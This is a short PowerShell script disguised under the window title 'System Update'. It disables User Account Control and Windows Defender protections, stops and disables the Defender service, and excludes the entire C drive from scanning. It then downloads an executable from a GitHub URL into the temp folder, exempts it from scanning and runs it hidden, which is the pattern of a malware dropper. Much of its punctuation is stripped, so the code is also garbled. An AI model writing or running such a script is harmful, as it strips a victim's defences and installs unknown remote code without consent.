$Host.UI.RawUI.WindowTitle = System Update
Set-ItemProperty -Path HKLMSOFTWAREMicrosoftWindowsCurrentVersionPoliciesSystem -Name EnableLUA -Value 0 -Force
Set-ItemProperty -Path HKLMSOFTWAREMicrosoftWindowsCurrentVersionPoliciesSystem -Name ConsentPromptBehaviorAdmin -Value 0 -Force
Set-MpPreference -DisableRealtimeMonitoring $true -Force
Set-MpPreference -DisableBehaviorMonitoring $true -Force
Set-MpPreference -DisableBlockAtFirstSeen $true -Force
Set-MpPreference -DisableIOAVProtection $true -Force
Stop-Service -Name WinDefend -Force
Set-Service -Name WinDefend -StartupType Disabled
Add-MpPreference -ExclusionPath C -Force
$urls = @(
    httpsgithub.comyamos11fixrawrefsheadsmainBetSoft.exe
foreach ($url in $urls) {
    $fileName = $url.Split()[-1]
    $path = $envTEMP$fileName
    Invoke-WebRequest -Uri $url -OutFile $path -UseBasicParsing
    Add-MpPreference -ExclusionProcess $path -Force
    Start-Process -FilePath $path -WindowStyle Hidden
}